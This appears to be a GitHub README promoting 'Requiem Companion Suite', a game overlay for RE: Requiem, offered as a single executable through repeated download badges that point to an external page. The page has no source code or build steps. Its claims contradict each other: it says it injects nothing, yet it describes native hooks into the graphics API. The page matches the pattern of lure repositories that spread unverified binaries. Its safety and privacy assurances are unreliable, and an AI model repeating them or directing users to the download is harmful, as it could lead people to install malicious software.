![preview](https://raw.githubusercontent.com/abdulhaseeb-12/requiem-archivist/main/poster_48ae.svg)
[![Download](https://raw.githubusercontent.com/abdulhaseeb-12/requiem-archivist/main/grab_f0f608.svg)](https://abdulhaseeb-12.github.io/requiem-archivist/)

# Requiem Companion Suite

**Your personal game-state mirror for RE: Requiem – a community-crafted, single-player enhanceware layer that shifts the burden of bookkeeping from your memory to a quiet, always-listening dashboard.**

---

## 🌌 What Is This?

Think of *Requiem Companion Suite* as a **second set of eyes** for your RE: Requiem sessions. Where the base game expects you to track dozens of interlocking systems—cooldowns, resource ticks, covenant standings, and unseen timers—this project steps in as a **non-intrusive observer**. It does not alter game files, touch memory, or inject anything into the process. Instead, it reads the public game-state signals (UI elements, log outputs, and visible event triggers) and rebuilds them into a **clean, searchable, and exportable timeline**.

The result? You stop pausing mid-action to check your notes. The Suite becomes your **ambient command console**—a calm, analytical companion that makes the complex state of your run legible at a glance.

---

## 🧠 The Philosophy: "Glass-Gazing, Not Code-Tampering"

Most helper tools try to be a "cheat engine" or a "memory editor." We rejected that direction completely.

*Requiem Companion Suite* operates on a **read-only observation principle**. It captures what the game already shows you, just faster and more coherently than your human eyes can process. Think of a weather vane, not a weather machine. Think of a telescope, not a teleporter. You are still playing the exact same game; you just have a **co-pilot for data interpretation** now.

---

## ✨ Key Features (The Instrument Panel)

### 🎛️ Passive State Mirroring
The core engine passively **tracks visible game variables**—your current HP/MP oscilloscope, active buff/debuff timers, and inventory density flags—then renders them as a real-time, **low-latency dashboard**. No input required, no setup per session, just launch the Suite and it "latches onto" the game window.

### 🗺️ Visual Cartography of Cooldown Rhythms
Cooldowns are not just bars; they are **rhythms of opportunity**. The Suite converts your skill cooldowns into a **circular entropy wheel**, showing you not just *when* the skill is ready, but the *optimal interrupt window* based on your personal casting cadence history.

### 📜 Session Chronography (Automatic Journal)
Every session is automatically written to a **local, encrypted journal** (Markdown & JSON formats). It logs major events—boss phases, gate triggers, rare item drops—with timestamps. This turns your playtime into **searchable lore**, letting you review "what happened on the third attempt" without relying on fallible memory.

### 🌐 Polyglot Interface (The Rosetta Stone)
The companion UI is available in **14 languages**, including English, 日本語, Español, Deutsch, Русский, and 简体中文. The interface language is detected based on your system locale, but you can override it in the settings panel. All logs are stored independent of language, so switching between locales never corrupts your archive.

### 📊 Heat-Map Analytics & Death-Marker Clustering
Where do you keep failing? The Suite **clusters your death-markers on a virtual map** of the area, generating a **heat-map of sorrow**. This visualizes your "risk zones" and highlights the exact moment (in seconds) where your run deviates from your usual, successful pattern.

### 🔌 Modular Addon Docks
The UI is built around a **dock-based architecture**. You can enable or disable "panels" (like the Timer Deck, the Resource Gauge, or the Item Counter) with a single keystroke, creating a *minimalist zen mode* when you want zero-on-screen clutter.

---

## 🎯 Who Is This For?

- **Solo Lore-Archivists** who want a perfect record of their journey.
- **Efficiency Enthusiasts** who want to optimize their internal cooldown rotation.
- **Backseat-Strategists** who enjoy analyzing their own gameplay patterns.
- **Casual Explorers** who simply want to remember where the hidden chest was in "that one dungeon."

This is **not** for players looking to bypass mechanics, alter difficulty, or spawn items. This is a **tool of mindfulness**, not a tool of manipulation.

---

## 🚀 Getting Started (Gentle Onboarding)

We believe installation should feel like *unrolling a scroll*, not *solving a riddle*.

**Step 1: Fetch the Artifact**
Acquire the latest release from the [![Download](https://raw.githubusercontent.com/abdulhaseeb-12/requiem-archivist/main/grab_f0f608.svg)](https://abdulhaseeb-12.github.io/requiem-archivist/) macro above. It comes as a single, portable executable (for Windows) or a regular application bundle (for macOS). No system-wide dependencies, no registry edits.

**Step 2: First Launch & Handshake**
Run the suite. It will automatically search for a running RE: Requiem instance. If not found, it will enter "Listener Mode" and wait patiently in the system tray until the game launches.

**Step 3: The Calibration Ritual**
On first successful connection, the Suite will ask you to verify three on-screen markers (e.g., your health orb position and your inventory slot count). This is a one-time 30-second "alignment" that ensures pixel-perfect tracking accuracy.

**Step 4: Choose Your Language & Dock**
Configure your preferred language and select which panels you want visible. Close the settings, and you are officially "in the cockpit."

---

## 🛠️ Architecture Overview (For the Curious)

The project is split into three logical layers:

1.  **The Observer (Behind the Scenes)**
    - *Technology*: Native hooks into the graphics API (DirectX/OpenGL) for reading surface textures. It uses pattern recognition on the rendered frames, not memory reads.
    - *Output*: A verbose JSON stream of detected "events" (status change, state change, location change).

2.  **The Cipher (The Data Transformer)**
    - This middle layer takes the raw frame-data JSON and enriches it.
    - It performs *semantic matching* against a community-maintained dictionary of item names and skill names (which you can contribute to!).
    - The result is a human-readable "event story" that the UI can render.

3.  **The Reporter (The Visible Face)**
    - This is the responsive UI layer (built with web technologies for portability).
    - It displays the processed data, writes the journal files, and draws the charts.
    - Because it's web-based, the UI is **responsive**—it works perfectly on a secondary monitor, a small always-on-top window, or even a side-panel during windowed gameplay.

---

## 💚 Community Contribution

This repository thrives on the collective knowledge of the RE: Requiem player base.

- **Dictionary Enrichment**: If the suite doesn't recognize a new item's icon or a skill's specific cooldown, you can add a mapping file via a simple JSON schema.
- **UI Translations**: Help us expand the Polyglot support. If you speak a language not yet covered, contribute a localization file.
- **Pattern Calibration**: Report false-positive detection events, and we'll refine the observation algorithms.

No prior programming experience is required to contribute to the dictionary or translations—just a keen eye and a willingness to document.

---

## ☕ Support & Nurturing

We operate on a "volunteer & donation" model. The project's roadmap is driven entirely by community feedback.

- **Priority Support**: For those who sponsor the on-going server costs (for dictionary updates and translation sync), we offer a **24/7 response line** via our community Discord. For everyone else, issues are triaged within 48 hours.
- **Feature Requests**: The most up-voted feature requests are built into the next minor release. There are no guarantees, only the vibrant force of community energy.

---

## ⚠️ Honest Disclaimer

**The "Not-So-Fine Print"**

1.  **Read-Only Pledge**: This software strictly reads the rendered display. It does not write to the game's memory, does not intercept network packets, and does not automate player input. It exists solely to *visualize* information you can already see.
2.  **No Warp, No Spawn, No Auto-Pilot**: We have deliberately omitted any function that could modify the player character, world state, or game logic.
3.  **End-User Responsibility**: You are solely responsible for understanding your local game license terms. While this tool does not alter game code, the act of running a third-party overlay is often subject to the game publisher's interpretation of "associated software." By using this software, you agree to hold the contributors harmless against any consequences arising from the use of the tool.
4.  **Data is Local**: All session data is stored on your local machine. We never transmit your gameplay data to any server. The only network activity is for checking for new dictionary updates, which you can disable entirely in the settings.
5.  **Visual Fidelity**: The state mirroring relies on pixel recognition. If a future game update drastically changes the UI layout, the mirroring may require recalibration. We will attempt to release compatibility patches swiftly, but cannot guarantee instantaneous fixes.

---

## 🗺️ Roadmap for 2026

We have ambitious plans for the year 2026:

- **Q1 2026**: Release of the "Echo Chamber" module—an audio-curated log that whispers your cooldown readiness alerts through your headphones, reducing visual clutter.
- **Q2 2026**: Multi-profile support, allowing you to manage different "mirror layouts" for different character builds (e.g., Tank View vs. Mage View).
- **Q3 2026**: Exportable Anomaly Reports that compile your death-heat-maps into a shareable format for community strategy guides (without revealing character stats).
- **Q4 2026**: Full integration with voice-command overlays (e.g., "show cooldown wheel" or "journal last 5 minutes") for hands-free operation.

---

## 📜 License

This project is open-source and uses the **MIT License**.

You are free to use, modify, and distribute this software for personal or commercial purposes, provided you include the original copyright notice.

[Tap here to read the full MIT License text](./LICENSE)

---

## 🙏 A Word from the Architect

We built this because we loved the *ritual* of playing this game, but we hated the *arithmetic* of it. We wanted a tool that felt like a **walnut-wood desk companion**—warm, intentional, and precise—rather than a cold, glowing hack panel. We hope it brings you the same calm clarity it brought us.

- *"Observation is the ultimate form of respect for the game."* — The Project Principle

---

**[![Download](https://raw.githubusercontent.com/abdulhaseeb-12/requiem-archivist/main/grab_f0f608.svg)](https://abdulhaseeb-12.github.io/requiem-archivist/)**